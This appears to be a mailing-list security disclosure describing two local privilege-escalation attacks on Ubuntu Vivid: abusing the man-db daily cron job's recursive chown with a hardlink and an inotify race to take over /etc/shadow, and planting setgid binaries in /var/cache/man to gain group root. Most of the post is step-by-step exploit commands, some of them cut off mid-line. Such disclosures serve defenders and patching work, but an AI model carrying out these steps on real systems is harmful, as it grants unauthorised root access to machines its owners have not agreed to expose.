I think you mentioned it already in some other post on this list.  !!! Just for reference, please ignore !!!  The daily mandb cleanup job for old catman pages changes the permissions of all non-man files to user man. This happens e.g. under Ubuntu Vivid with /etc/cron.daily/man-db when systemd is not installed (/run/systemd/system does not exist). The problematic code is  # expunge old catman pages which have not been read in a week if [ ! -d /run/systemd/system ] && [ -d /var/cache/man ]; then   cd /   if ! dpkg-statoverride --list /var/cache/man >/dev/null 2>&1; then     echo "Running find" >&2     find /var/cache/man -ignore_readdir_race ! -user man -print0 | \       xargs -r0 chown -f man || true   fi   start-stop-daemon --start --pidfile /dev/null --startas /bin/sh \         --oknodo --chuid man $iosched_idle -- -c \         "find /var/cache/man -type f -name '*.gz' -atime +6 -print0 | \          xargs -r0 rm -f" fi  With https://www.halfdog.net/Misc/Utils/DirModifyInotify.c this can be used to change owenership of /etc/shadow and escalate to root. To start, a hardlink to a file of a different user has to be created.  man# mkdir -p /var/cache/man/etc man# ln /var/crash/.lock /var/cache/man/etc/shadow man# ./DirModifyInotify --Watch /var/cache/man/etc --WatchCount 0 - --MovePath /var/cache/man/etc --LinkTarget /etc ... Wait till daily cronjob was run man# cp /etc/shadow . man# sed -r -e /etc/shadow > x man# cat x > /etc/shadow; rm x man# su -s /bin/sh (password is root# cat shadow > /etc/shadow; chown root /etc/shadow  Read more at     On some Linux systems, directories with setgid bit set may be found, e.g. using find / -type d -perm On Ubuntu Vivid this includes  drwxr-sr-x 25 man  root  May 15 /var/cache/man  Creating a file as user man/man with setgid-bit flags will produce a file with setgit bit really set but uid man/root. Normal writes will cause loss of setgid bit, but crafted writing allows to fill the file and hence escalate privileges to group root:  man$ cd /var/cache/man man$ wget -q man$ gcc -o CreateSetgidBinary CreateSetgidBinary.c man$ ./CreateSetgidBinary ./escalate /bin/mount x nonexistent-arg man$ ls -al ./escalate - -rwsrwsr-t 1 man root May 15 ./escalate man$ ./escalate /bin/sh man$ ls -al /proc/self/ total 0 dr-xr-xr-x   9 man  root 0 May 15 .
